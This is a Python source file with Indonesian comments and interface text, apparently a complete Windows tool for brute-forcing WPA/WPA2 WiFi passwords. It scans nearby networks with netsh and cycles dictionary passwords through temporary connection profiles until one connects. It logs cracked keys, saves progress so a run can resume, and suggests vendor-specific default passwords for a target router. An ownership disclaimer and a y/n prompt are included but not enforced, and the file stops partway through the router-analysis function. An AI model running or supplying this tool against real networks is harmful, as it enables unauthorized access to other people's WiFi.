"""
WiFi Brute Force Tool v3.0 - Windows
Untuk Pengujian Keamanan Jaringan Sendiri

Persyaratan:
    - Windows 10/11, Python 3.7+
    - Jalankan sebagai Administrator
    - WiFi adapter aktif
"""

import subprocess
import sys
import os
import time
import signal
import ctypes
import msvcrt
import glob
from datetime import datetime, timedelta
import random


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DICT_DIR = os.path.join(BASE_DIR, "dictionaries")


# ─── Enable ANSI + UTF-8 di Windows ──────────────────────────
def enable_ansi():
    if os.name == "nt":
        try:
            os.system("chcp 65001 >nul 2>&1")
            sys.stdout.reconfigure(encoding="utf-8")
            sys.stdin.reconfigure(encoding="utf-8")
        except Exception:
            pass
        try:
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)
            mode = ctypes.c_ulong()
            kernel32.GetConsoleMode(handle, ctypes.byref(mode))
            kernel32.SetConsoleMode(handle, mode.value | 0x0004)
        except Exception:
            pass


# ─── Warna Terminal ───────────────────────────────────────────
class C:
    CY = "\033[96m"; GR = "\033[92m"; YE = "\033[93m"; RE = "\033[91m"
    WH = "\033[97m"; DM = "\033[2m"; BD = "\033[1m"; RS = "\033[0m"
    MG = "\033[35m"


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    print(f"""
{C.CY}{C.BD}
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ██╗    ██╗██╗███████╗██╗    ██████╗ ███████╗        ║
    ║   ██║    ██║██║██╔════╝██║    ██╔══██╗██╔════╝        ║
    ║   ██║ █╗ ██║██║█████╗  ██║    ██████╔╝█████╗          ║
    ║   ██║███╗██║██║██╔══╝  ██║    ██╔══██╗██╔══╝          ║
    ║   ╚███╔███╔╝██║██║     ██║    ██████╔╝██║             ║
    ║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝             ║
    ║                                                       ║
    ║           WiFi Brute Force Tool v3.0                  ║
    ║         Pengujian Keamanan Jaringan Sendiri            ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
{C.RS}
{C.YE}    ⚠  Hanya untuk jaringan WiFi milik Anda sendiri!{C.RS}
{C.DM}    ─────────────────────────────────────────────────{C.RS}
""")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


# ─── Process Cleanup ──────────────────────────────────────────
def kill_self():
    """Kill process tree — mencegah orphan process setelah CMD ditutup."""
    try:
        pid = os.getpid()
        os.system(f"taskkill /F /PID {pid} /T >nul 2>&1")
    except Exception:
        pass
    os._exit(0)


def setup_signal_handlers():
    """Handle CMD close / Ctrl+C / Ctrl+Break dengan graceful cleanup."""
    def cleanup_and_exit(sig, frame):
        tpath = os.path.join(BASE_DIR, "temporary.xml")
        if os.path.exists(tpath):
            try:
                os.remove(tpath)
            except OSError:
                pass
        kill_self()

    signal.signal(signal.SIGINT, cleanup_and_exit)
    signal.signal(signal.SIGTERM, cleanup_and_exit)
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, cleanup_and_exit)


# ─── Arrow Key Selector ───────────────────────────────────────
def select_with_arrows(options, title="Pilih dengan tombol panah"):
    """
    Arrow key interactive selector. Return index atau -1 batal.
    options: list of dicts dengan keys 'name', 'info'
    """
    idx = 0
    visible_start = 0
    max_visible = min(len(options), 15)

    while True:
        cls()
        print(f"\n{C.CY}{C.BD}  {title}{C.RS}")
        print(f"{C.DM}  ─────────────────────────────────────────{C.RS}")

        if idx < visible_start:
            visible_start = idx
        elif idx >= visible_start + max_visible:
            visible_start = idx - max_visible + 1

        for i in range(visible_start, min(visible_start + max_visible, len(options))):
            opt = options[i]
            name = opt["name"]
            info = opt["info"]
            if i == idx:
                print(f"  {C.CY}▶ {C.WH}{name:<35} {C.DM}{info}{C.RS}")
            else:
                print(f"    {C.DM}{name:<35} {info}{C.RS}")

        if len(options) > max_visible:
            print(f"\n  {C.DM}[{visible_start+1}-{min(visible_start+max_visible, len(options))} dari {len(options)}]{C.RS}")

        print(f"\n  {C.DM}↑/↓ Navigate  •  Enter Select  •  Q Cancel{C.RS}")

        key = msvcrt.getch()

        if key == b"\xe0":  # Arrow key prefix
            key2 = msvcrt.getch()
            if key2 == b"H":  # Up
                idx = max(0, idx - 1)
            elif key2 == b"P":  # Down
                idx = min(len(options) - 1, idx + 1)
            elif key2 == b"I":  # Page Up
                idx = max(0, idx - max_visible)
            elif key2 == b"Q":  # Page Down
                idx = min(len(options) - 1, idx + max_visible)
        elif key == b"\r" or key == b"\n":  # Enter
            return idx
        elif key.lower() == b"q":
            return -1

    return -1


# ═══════════════════════════════════════════════════════════════
#  PROFILES & AUTH
# ═══════════════════════════════════════════════════════════════
AUTH_TEMPLATES = {
    "WPA2PSK": """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID><name>{ssid}</name></SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>""",
    "WPAPSK": """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID><name>{ssid}</name></SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPAPSK</authentication>
                <encryption>TKIP</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>""",
}


def get_profile_xml(ssid, password, auth_type):
    template = AUTH_TEMPLATES.get(auth_type, AUTH_TEMPLATES["WPA2PSK"])
    return template.format(ssid=ssid, password=password)


# ═══════════════════════════════════════════════════════════════
#  SCANNER
# ═══════════════════════════════════════════════════════════════
def scan_networks():
    print(f"\n{C.CY}[*] Memindai jaringan WiFi...{C.RS}\n")
    try:
        r = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, encoding="utf-8", errors="replace"
        )
        if r.returncode != 0:
            print(f"{C.RE}[!] Gagal memindai.{C.RS}")
            return []

        nets, cur = [], {}
        for line in r.stdout.split("\n"):
            line = line.strip()
            if line.startswith("SSID") and "BSSID" not in line:
                parts = line.split(":", 1)
                if len(parts) > 1 and parts[1].strip():
                    cur = {"ssid": parts[1].strip()}
            elif "Authentication" in line or "Autentikasi" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["auth"] = parts[1].strip()
            elif "Signal" in line or "Sinyal" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["signal"] = parts[1].strip()
                    if "ssid" in cur:
                        nets.append(cur.copy())

        seen, unique = set(), []
        for n in nets:
            if n["ssid"] not in seen:
                seen.add(n["ssid"])
                unique.append(n)
        return unique
    except Exception as e:
        print(f"{C.RE}[!] Error: {e}{C.RS}")
        return []


def show_networks(nets):
    if not nets:
        print(f"{C.RE}[!] Tidak ada jaringan ditemukan.{C.RS}")
        return
    print(f"{C.WH}{C.BD}  {'No.':<5} {'SSID':<30} {'Signal':<12} {'Auth'}{C.RS}")
    print(f"  {'─'*5} {'─'*30} {'─'*12} {'─'*20}")
    for i, n in enumerate(nets, 1):
        sig = n.get("signal", "N/A")
        try:
            sv = int(sig.replace("%", ""))
            sc = C.GR if sv >= 70 else C.YE if sv >= 40 else C.RE
        except ValueError:
            sc = C.DM
        print(f"  {C.CY}{i:<5}{C.RS} {C.WH}{n['ssid']:<30}{C.RS} "
              f"{sc}{sig:<12}{C.RS} {C.DM}{n.get('auth','N/A')}{C.RS}")


# ═══════════════════════════════════════════════════════════════
#  NETSH ENGINE (Optimized)
# ═══════════════════════════════════════════════════════════════
RUN = dict(capture_output=True, text=True, encoding="utf-8", errors="replace")

_last_iface_time = 0.0
_last_iface_out = ""


def _netsh(*args):
    return subprocess.run(["netsh"] + list(args), **RUN)


def _netsh_iface_cached():
    """Cache netsh wlan show interfaces — 100ms TTL."""
    global _last_iface_time, _last_iface_out
    now = time.time()
    if now - _last_iface_time > 0.1:
        r = _netsh("wlan", "show", "interfaces")
        _last_iface_out = r.stdout
        _last_iface_time = now
    return _last_iface_out


def _check_connected(ssid):
    out = _netsh_iface_cached().lower()
    ssid_l = ssid.lower()
    if ssid_l not in out:
        return False
    for line in out.split("\n"):
        ll = line.strip()
        if any(k in ll for k in ["state", "status", "keadaan"]):
            if "disconnect" in ll or "terputus" in ll:
                return False
            if "connected" in ll or "tersambung" in ll:
                return True
    return False


def try_password(ssid, password, profile_path, auth_type="WPA2PSK"):
    xml = get_profile_xml(ssid, password, auth_type)
    with open(profile_path, "w", encoding="utf-8") as f:
        f.write(xml)

    _netsh("wlan", "delete", "profile", f"name={ssid}")
    add = _netsh("wlan", "add", "profile", f"filename={profile_path}")
    if add.returncode != 0:
        return False

    _netsh("wlan", "connect", f"name={ssid}")

    # Smart polling: 4x 0.4s = 1.6s max (faster than old 3s)
    for _ in range(4):
        time.sleep(0.4)
        out = _netsh_iface_cached().lower()

        if "authenticating" not in out and "associating" not in out:
            if _check_connected(ssid):
                return True
            if "disconnect" in out or "terputus" in out:
                return False

    return _check_connected(ssid)


# ═══════════════════════════════════════════════════════════════
#  DICTIONARY
# ═══════════════════════════════════════════════════════════════
def scan_dictionaries():
    """Scan folder dictionaries/ dan return list file .txt."""
    if not os.path.isdir(DICT_DIR):
        os.makedirs(DICT_DIR, exist_ok=True)
        return []

    files = glob.glob(os.path.join(DICT_DIR, "*.txt"))
    result = []
    for fp in sorted(files):
        name = os.path.basename(fp)
        count = 0
        size = os.path.getsize(fp)
        try:
            with open(fp, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and len(line) >= 8:
                        count += 1
        except Exception:
            pass
        size_str = f"{size/1024:.0f}KB" if size >= 1024 else f"{size}B"
        info = f"({count} pass, {size_str})"
        result.append({"name": name, "path": fp, "info": info})
    return result


def choose_dictionary():
    """Interactive arrow-key dictionary picker."""
    dicts = scan_dictionaries()
    if not dicts:
        print(f"\n  {C.RE}[!] Tidak ada dictionary di folder dictionaries/{C.RS}")
        print(f"  {C.DM}Taruh file .txt ke folder dictionaries/{C.RS}")
        return None

    options = [{"name": d["name"], "info": d["info"]} for d in dicts]
    idx = select_with_arrows(options, "Pilih Dictionary")
    if idx == -1:
        return None
    return dicts[idx]["path"]


def load_dict(filepath, shuffle=True):
    """Muat dictionary, skip komentar dan password < 8 char."""
    pws = []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and len(line) >= 8:
                    pws.append(line)
    except FileNotFoundError:
        print(f"{C.RE}[!] File tidak ditemukan: {filepath}{C.RS}")
    if shuffle:
        random.shuffle(pws)
    return pws


# ═══════════════════════════════════════════════════════════════
#  PROGRESS & RESULTS
# ═══════════════════════════════════════════════════════════════
def load_progress(ssid):
    prog_file = os.path.join(BASE_DIR, ".progress")
    try:
        with open(prog_file, "r") as f:
            data = f.read().strip().split("|")
            if len(data) == 2 and data[0] == ssid:
                return int(data[1])
    except Exception:
        pass
    return 0


def save_progress(ssid, index):
    prog_file = os.path.join(BASE_DIR, ".progress")
    with open(prog_file, "w") as f:
        f.write(f"{ssid}|{index}")


def clear_progress():
    prog_file = os.path.join(BASE_DIR, ".progress")
    if os.path.exists(prog_file):
        os.remove(prog_file)


def save_result(ssid, password, attempts, elapsed):
    log = os.path.join(BASE_DIR, "results.log")
    with open(log, "a", encoding="utf-8") as f:
        f.write(f"{'='*50}\n")
        f.write(f"SSID     : {ssid}\n")
        f.write(f"Password : {password}\n")
        f.write(f"Percobaan: {attempts}\n")
        f.write(f"Waktu    : {format_time(elapsed)}\n")
        f.write(f"Tanggal  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*50}\n\n")


def format_time(td):
    if isinstance(td, timedelta):
        total = int(td.total_seconds())
    else:
        total = int(td)
    h, remainder = divmod(total, 3600)
    m, s = divmod(remainder, 60)
    if h > 0:
        return f"{h}j {m}m {s}d"
    elif m > 0:
        return f"{m}m {s}d"
    return f"{s}d"


# ═══════════════════════════════════════════════════════════════
#  BRUTE FORCE ENGINE
# ═══════════════════════════════════════════════════════════════
def bruteforce(ssid, dict_path, delay=0.5, auth_type="WPA2PSK", shuffle=True):
    passwords = load_dict(dict_path, shuffle=shuffle)
    if not passwords:
        print(f"{C.RE}[!] Dictionary kosong.{C.RS}")
        return None

    total = len(passwords)
    profile_path = os.path.join(BASE_DIR, "temporary.xml")

    # Resume support
    start_idx = load_progress(ssid)
    if start_idx > 0 and start_idx < total:
        print(f"\n  {C.YE}[*] Progress sebelumnya ditemukan (password ke-{start_idx}).{C.RS}")
        resume = input(f"  {C.WH}Lanjutkan dari situ? (y/n): {C.RS}").strip().lower()
        if resume != "y":
            start_idx = 0

    print(f"\n{C.CY}{'═'*60}{C.RS}")
    print(f"{C.BD}{C.WH}  Target SSID   : {C.CY}{ssid}{C.RS}")
    print(f"{C.BD}{C.WH}  Dictionary    : {C.CY}{os.path.basename(dict_path)}{C.RS}")
    print(f"{C.BD}{C.WH}  Total Password: {C.CY}{total}{C.RS}")
    print(f"{C.BD}{C.WH}  Mulai dari    : {C.CY}#{start_idx + 1}{C.RS}")
    print(f"{C.BD}{C.WH}  Auth Type     : {C.CY}{auth_type}{C.RS}")
    print(f"{C.BD}{C.WH}  Delay         : {C.CY}{delay}s + smart polling{C.RS}")
    print(f"{C.CY}{'═'*60}{C.RS}\n")

    start_time = datetime.now()
    found = None
    times = []

    i = start_idx - 1
    try:
        for i in range(start_idx, total):
            pw = passwords[i]
            attempt = i + 1
            remaining = total - attempt

            if times:
                avg = sum(times[-20:]) / len(times[-20:])
                eta_secs = remaining * avg
                eta_str = format_time(timedelta(seconds=eta_secs))
            else:
                eta_str = "menghitung..."

            pct = (attempt / total) * 100
            filled = int((attempt / total) * 25)
            bar = f"{'█' * filled}{'░' * (25 - filled)}"

            print(f"\r  {C.YE}[{bar}] {pct:5.1f}%{C.RS} "
                  f"{C.DM}({attempt}/{total}){C.RS} "
                  f"{C.WH}{pw:<22}{C.RS} "
                  f"{C.DM}ETA: {eta_str}{C.RS}   ", end="", flush=True)

            t0 = time.time()
            if try_password(ssid, pw, profile_path, auth_type):
                elapsed = datetime.now() - start_time
                found = pw

                print(f"\n\n{C.GR}{'═'*60}")
                print(f"  PASSWORD DITEMUKAN!")
                print(f"{'═'*60}{C.RS}")
                print(f"\n  {C.BD}{C.WH}SSID     : {C.GR}{ssid}{C.RS}")
                print(f"  {C.BD}{C.WH}Password : {C.GR}{pw}{C.RS}")
                print(f"  {C.BD}{C.WH}Percobaan: {C.GR}{attempt}/{total}{C.RS}")
                print(f"  {C.BD}{C.WH}Waktu    : {C.GR}{format_time(elapsed)}{C.RS}")
                print(f"\n{C.GR}{'═'*60}{C.RS}\n")

                save_result(ssid, pw, attempt, elapsed)
                clear_progress()
                break

            elapsed_pw = time.time() - t0
            times.append(elapsed_pw)

            if attempt % 10 == 0:
                save_progress(ssid, i + 1)

            time.sleep(delay)

        else:
            elapsed = datetime.now() - start_time
            print(f"\n\n{C.RE}{'═'*60}")
            print(f"  PASSWORD TIDAK DITEMUKAN")
            print(f"{'═'*60}{C.RS}")
            print(f"\n  {C.DM}Dicoba: {total} password dalam {format_time(elapsed)}{C.RS}")
            print(f"  {C.DM}Coba dictionary yang lebih besar.{C.RS}\n")
            clear_progress()

    except (KeyboardInterrupt, SystemExit):
        save_progress(ssid, i)
        print(f"\n\n{C.YE}[!] Dihentikan pada #{attempt}. Progress tersimpan.{C.RS}")
        print(f"  {C.DM}Jalankan ulang untuk melanjutkan dari posisi ini.{C.RS}\n")

    finally:
        if os.path.exists(profile_path):
            try:
                os.remove(profile_path)
            except OSError:
                pass

    return found


# ═══════════════════════════════════════════════════════════════
#  AUTH TYPE DETECTION
# ═══════════════════════════════════════════════════════════════
AUTH_MAP = {
    "WPA2-Personal": "WPA2PSK",
    "WPA2-PersonalPSK": "WPA2PSK",
    "WPA-Personal": "WPAPSK",
    "WPA-PersonalPSK": "WPAPSK",
    "WPA2PSK": "WPA2PSK",
    "WPAPSK": "WPAPSK",
    "WPA3-Personal": None,
    "WPA3SAE": None,
    "Open": None,
    "None": None,
}


def detect_auth_type(netsh_auth_str):
    auth_l = netsh_auth_str.strip().lower()
    for key, val in AUTH_MAP.items():
        if key.lower() == auth_l:
            return val
    if "wpa3" in auth_l or "sae" in auth_l:
        return None
    if "wpa2" in auth_l:
        return "WPA2PSK"
    if "wpa" in auth_l:
        return "WPAPSK"
    if "open" in auth_l or "none" in auth_l:
        return None
    return "WPA2PSK"


def scan_and_find(ssid_target):
    nets = scan_networks()
    for n in nets:
        if n["ssid"].lower() == ssid_target.lower():
            auth_str = n.get("auth", "")
            return detect_auth_type(auth_str), auth_str, n.get("signal", "N/A")
    return None, None, None


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    enable_ansi()
    setup_signal_handlers()
    cls()
    banner()

    leftover = os.path.join(BASE_DIR, "temporary.xml")
    if os.path.exists(leftover):
        try:
            os.remove(leftover)
        except OSError:
            pass

    if not is_admin():
        print(f"{C.RE}{C.BD}")
        print(f"  ╔════════════════════════════════════════════════╗")
        print(f"  ║  HARUS DIJALANKAN SEBAGAI ADMINISTRATOR!      ║")
        print(f"  ║                                                ║")
        print(f"  ║  Klik kanan > Run as Administrator             ║")
        print(f"  ╚════════════════════════════════════════════════╝")
        print(f"{C.RS}")
        input(f"\n  Tekan Enter untuk keluar...")
        sys.exit(1)

    print(f"{C.YE}{C.BD}")
    print(f"  ╔════════════════════════════════════════════════════╗")
    print(f"  ║  Program ini HANYA untuk menguji keamanan         ║")
    print(f"  ║  jaringan WiFi yang Anda MILIKI sendiri.          ║")
    print(f"  ║  Penggunaan tanpa izin ILEGAL (UU ITE Pasal 30).  ║")
    print(f"  ╚════════════════════════════════════════════════════╝")
    print(f"{C.RS}")

    if input(f"  {C.WH}Anda pemilik jaringan yang akan diuji? (y/n): {C.RS}").strip().lower() != "y":
        print(f"\n  {C.RE}Dibatalkan.{C.RS}\n")
        sys.exit(0)

    while True:
        print(f"\n{C.CY}{C.BD}  ┌──────────────────────────────────┐")
        print(f"  │         MENU UTAMA               │")
        print(f"  ├──────────────────────────────────┤")
        print(f"  │  [1] Scan Jaringan WiFi          │")
        print(f"  │  [2] Mulai Brute Force           │")
        print(f"  │  [3] Lihat Hasil Sebelumnya      │")
        print(f"  │  [4] Analisis Target Router      │")
        print(f"  │  [0] Keluar                      │")
        print(f"  └──────────────────────────────────┘{C.RS}")

        ch = input(f"\n  {C.WH}Pilih [{C.CY}0-4{C.WH}]: {C.RS}").strip()

        if ch == "1":
            nets = scan_networks()
            show_networks(nets)

        elif ch == "2":
            print(f"\n  {C.DM}Tip: Jalankan [1] Scan dulu untuk lihat jaringan{C.RS}")
            ssid = input(f"  {C.WH}SSID target: {C.RS}").strip()
            if not ssid:
                print(f"  {C.RE}[!] SSID kosong.{C.RS}")
                continue

            print(f"\n  {C.CY}[*] Memindai folder dictionaries...{C.RS}")
            time.sleep(0.3)
            dict_path = choose_dictionary()
            if not dict_path:
                print(f"  {C.RE}[!] Tidak ada dictionary dipilih.{C.RS}")
                continue

            di = input(f"  {C.WH}Delay (detik) [{C.DM}0.5{C.WH}]: {C.RS}").strip()
            try:
                delay = float(di) if di else 0.5
            except ValueError:
                delay = 0.5

            print(f"\n  {C.CY}[*] Auto-detect auth type dari scan...{C.RS}")
            auth_key, auth_str, signal = scan_and_find(ssid)
            if auth_str:
                print(f"  {C.GR}[+] Ditemukan: {auth_str} (Signal: {signal}){C.RS}")
                if auth_key:
                    print(f"  {C.CY}    → Menggunakan template: {auth_key}{C.RS}")
                else:
                    print(f"  {C.RE}[!] Auth type '{auth_str}' tidak didukung untuk brute force.{C.RS}")
                    auth_key = input(f"  {C.WH}Pilih auth [WPA2PSK/WPAPSK] [{C.DM}WPA2PSK{C.WH}]: {C.RS}").strip().upper()
                    if auth_key not in ["WPA2PSK", "WPAPSK"]:
                        auth_key = "WPA2PSK"
            else:
                print(f"  {C.YE}[!] SSID tidak ditemukan di scan. Pilih auth type manual:{C.RS}")
                print(f"      {C.DM}[1] WPA2PSK (default, paling umum){C.RS}")
                print(f"      {C.DM}[2] WPAPSK  (WPA lama){C.RS}")
                ach = input(f"  {C.WH}Pilih [{C.CY}1-2{C.WH}] [1]: {C.RS}").strip()
                auth_key = "WPAPSK" if ach == "2" else "WPA2PSK"

            print(f"\n  {C.YE}[!] Mulai brute force '{ssid}' (auth: {auth_key})...{C.RS}")
            print(f"  {C.DM}Tekan Ctrl+C untuk stop & simpan progress{C.RS}")
            sh = input(f"  {C.WH}Urutan password? [{C.CY}R{C.WH}]andom / [{C.CY}S{C.WH}]orted [R]: {C.RS}").strip().upper()
            shuffle = sh != "S"
            if shuffle:
                print(f"  {C.CY}→ Acak (shuffle) — password dicoba secara random{C.RS}")
            else:
                print(f"  {C.CY}→ Urut — password dicoba sesuai urutan file{C.RS}")
            if input(f"  {C.WH}Lanjutkan? (y/n): {C.RS}").strip().lower() == "y":
                bruteforce(ssid, dict_path, delay, auth_key, shuffle=shuffle)

        elif ch == "3":
            log = os.path.join(BASE_DIR, "results.log")
            if os.path.exists(log):
                print(f"\n{C.GR}{'─'*50}{C.RS}")
                with open(log, "r", encoding="utf-8") as f:
                    print(f.read())
                print(f"{C.GR}{'─'*50}{C.RS}")
            else:
                print(f"\n  {C.DM}Belum ada hasil.{C.RS}")

        elif ch == "4":
            analyze_target()

        elif ch == "0":
            print(f"\n  {C.CY}Selesai. Gunakan secara bertanggung jawab.{C.RS}\n")
            break
        else:
            print(f"  {C.RE}[!] Pilihan tidak valid.{C.RS}")



# ═══════════════════════════════════════════════════════════════
#  VENDOR DETECTION & ROUTER INFO
# ═══════════════════════════════════════════════════════════════
VENDOR_DB = {
    "zte": ["ZTE", "Zte", "zte", "F670", "F609", "F660", "F680", "ZXHN", "ZXV10"],
    "huawei": ["Huawei", "HUAWEI", "huawei", "HG", "AX", "OptiX", "HG8145", "HG8245"],
    "tp-link": ["TP-Link", "TP-LINK", "tplink", "Archer", "Deco", "Tapo"],
    "tenda": ["Tenda", "TENDA", "tenda"],
    "d-link": ["D-Link", "D-LINK", "dlink", "DIR"],
    "netgear": ["Netgear", "NETGEAR", "netgear", "Nighthawk", "Orbi"],
    "linksys": ["Linksys", "LINKSYS", "linksys"],
    "asus": ["ASUS", "Asus", "asus", "RT-AC", "RT-AX"],
    "xiaomi": ["Xiaomi", "XIAOMI", "xiaomi", "Redmi", "Mi Router"],
    "tenda": ["Tenda", "TENDA", "tenda"],
    "fiberhome": ["Fiberhome", "FIBERHOME", "fiberhome", "SFH", "AN5506"],
    "mercusys": ["Mercusys", "MERCUSYS", "mercusys", "MW", "Halo"],
    "ubiquiti": ["Ubiquiti", "UniFi", "UBNT", "ubnt"],
    "mikrotik": ["MikroTik", "Mikrotik", "MIKROTIK"],
    "arris": ["Arris", "ARRIS", "arris", "Surfboard"],
    "netis": ["Netis", "NETIS", "netis"],
    "ruijie": ["Ruijie", "RUIJIE", "ruijie", "Reyee"],
    "cambium": ["Cambium", "CAMBIUM", "cambium"],
    "broadband": ["IndiHome", "indihome", "Telkom", "TELKOM", "Biznet", "biznet", "MyRepublic"],
}

def guess_vendor(ssid):
    """Coba tebak vendor router dari SSID."""
    for vendor, keywords in VENDOR_DB.items():
        for kw in keywords:
            if kw.lower() in ssid.lower():
                return vendor
    return None


def scan_networks_detailed():
    """Scan dengan parsing BSSID (MAC address) untuk info lebih detail."""
    print(f"\n{C.CY}[*] Memindai jaringan WiFi (detail)...{C.RS}\n")
    try:
        r = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, encoding="utf-8", errors="replace"
        )
        if r.returncode != 0:
            return []
        nets, cur = [], {}
        for line in r.stdout.split("\n"):
            line = line.strip()
            if line.startswith("SSID") and "BSSID" not in line:
                parts = line.split(":", 1)
                if len(parts) > 1 and parts[1].strip():
                    cur = {"ssid": parts[1].strip()}
            elif "BSSID" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["bssid"] = parts[1].strip()
            elif "Authentication" in line or "Autentikasi" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["auth"] = parts[1].strip()
            elif "Encryption" in line or "Enkripsi" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["encryption"] = parts[1].strip()
            elif "Signal" in line or "Sinyal" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["signal"] = parts[1].strip()
            elif "Channel" in line or "Saluran" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["channel"] = parts[1].strip()
            elif "Radio type" in line or "Jenis radio" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    cur["radio"] = parts[1].strip()
                    if "ssid" in cur:
                        nets.append(cur.copy())

        seen, unique = set(), []
        for n in nets:
            if n["ssid"] not in seen:
                seen.add(n["ssid"])
                n["vendor"] = guess_vendor(n["ssid"])
                unique.append(n)
        return unique
    except Exception as e:
        print(f"{C.RE}[!] Error: {e}{C.RS}")
        return []


def analyze_target():
    """Analisis target: info detail + vendor + saran password."""
    print(f"\n{C.CY}{C.BD}  ┌──────────────────────────────────┐")
    print(f"  │  [4] Analisis Target Router       │")
    print(f"  └──────────────────────────────────┘{C.RS}")

    ssid = input(f"\n  {C.WH}SSID target: {C.RS}").strip()
    if not ssid:
        print(f"  {C.RE}[!] SSID kosong.{C.RS}")
        return

    nets = scan_networks_detailed()
    target = None
    for n in nets:
        if n["ssid"].lower() == ssid.lower():
            target = n
            break

    if not target:
        print(f"  {C.YE}[!] SSID '{ssid}' tidak ditemukan di scan.{C.RS}")
        print(f"  {C.DM}   Pastikan SSID terlihat di menu [1] Scan dulu.{C.RS}")
        return

    # ── Display info ──
    print(f"\n{C.GR}{'═'*52}{C.RS}")
    print(f"  {C.WH}{C.BD}ROUTER INFO — {ssid}{C.RS}")
    print(f"{C.GR}{'─'*52}{C.RS}")

    vendor = target.get("vendor")
    if vendor:
        print(f"  {C.CY}Vendor     : {C.WH}{vendor.upper()}{C.RS}")
    else:
        print(f"  {C.CY}Vendor     : {C.DM}Tidak diketahui{C.RS}")

    print(f"  {C.CY}Auth       : {C.WH}{target.get('auth', 'N/A')}{C.RS}")
    print(f"  {C.CY}Encryption : {C.WH}{target.get('encryption', 'N/A')}{C.RS}")
    print(f"  {C.CY}Signal     : {C.WH}{target.get('signal', 'N/A')}{C.RS}")
    print(f"  {C.CY}Channel    : {C.WH}{target.get('channel', 'N/A')}{C.RS}")
    print(f"  {C.CY}Radio      : {C.WH}{target.get('radio', 'N/A')}{C.RS}")
    if "bssid" in target:
        print(f"  {C.CY}MAC        : {C.WH}{target['bssid']}{C.RS}")

    # ── Vendor-based password suggestions ──
    print(f"\n{C.GR}{'─'*52}{C.RS}")
    print(f"  {C.WH}{C.BD}SARAN PASSWORD BERDASARKAN VENDOR:{C.RS}")
    print(f"{C.GR}{'─'*52}{C.RS}")

    default_hints = {
        "zte": [
            "zte12345, zte@1234, zte@12345, zte@123456, zte1234!",
            "zte@admin, ZTE12345, ZTE@1234, zteadmin1",
        ],
        "huawei": [
            "huawei123, huawei@123, admin@123, huawei1234",
            "Huawei@123, HW123456, huawei@1234",
        ],
        "tp-link": [
            "tplink123, tplink@123, admin1234, tplink12345",
            "TPLINK@123, tplinkwifi, admin123456",
        ],
        "tenda": [
            "tenda1234, tenda@123, tenda12345, Tenda@123",
            "Tenda1234, tenda@123456",
        ],
        "d-link": [
            "admin1234, dlink1234, dlink@123, D-Link123",
            "dlink12345, Dlink@123",
        ],
        "xiaomi": [
            "xiaomi123, xiaomi@123, xiaomi@1234, xiaomiwifi",
            "Xiaomi@123, redmi@1234",
        ],
        "fiberhome": [
            "fiberhome123, fiberhome@123, Fiberhome@123",
            "fiber@123456, FIBERHOME123",
        ],
        "netgear": [
            "netgear123, netgear@123, password1, Netgear@123",
            "NETGEAR@123",
        ],
        "linksys": [
            "admin1234, linksys123, linksys@123, Linksys@123",
        ],
        "asus": [
            "asus1234, asus@1234, ASUS@1234, asus@123456",
        ],
        "mercusys": [
            "mercusys123, mercusys@123, MERCUSYS@123",
            "mercusys@1234",
        ],
        "ubiquiti": [
            "ubnt1234, ubnt@1234, UBNT1234, ubnt@12345",
        ],
        "mikrotik": [
            "mikrotik123, mikrotik@123, admin1234",
            "MIKROTIK@123",
        ],
        "arris": [
            "arris1234, arris@123, ARRIS@123, arrispw",
        ],
    }

    if vendor and vendor in default_hints:
        print(f"  {C.GR}[+]{C.WH} {vendor.upper()} — password default umum:{C.RS}")
        for hint in default_hints[vendor]:
            print(f"      {C.DM}→ {hint}{C.RS}")
    else:
        print(f"  {C.DM}[!] Vendor tidak dikenali, coba password umum:{C.RS}")
        print(f"      {C.DM}→ password123, admin12345678, welcome123{C.RS}")

    # ── SSID-based suggestions ──
    ssid_parts = ssid.replace("-", " ").replace("_", " ").split()
    if len(ssid_parts) > 1:
